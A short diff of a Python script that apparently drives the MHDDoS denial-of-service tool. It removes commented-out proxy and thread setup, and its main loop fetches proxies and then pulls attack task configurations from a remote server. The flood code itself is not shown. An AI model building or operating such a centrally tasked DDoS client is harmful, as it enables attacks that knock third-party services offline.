@@ -172,13 +172,7 @@ if __name__ == '__main__':
         logger.info("Get fresh proxies. Please wait...")
         update_file()
 
-        #MHDDoS.threads = 10
-        #proxy_config = json.load(open("MHDDoS/config.json"))
-        #MHDDoS.handleProxyList(proxy_config, Path(
-        #    "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)
-
         while True:
-
             logger.info("Getting fresh tasks from the server!")
             try:
                 for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
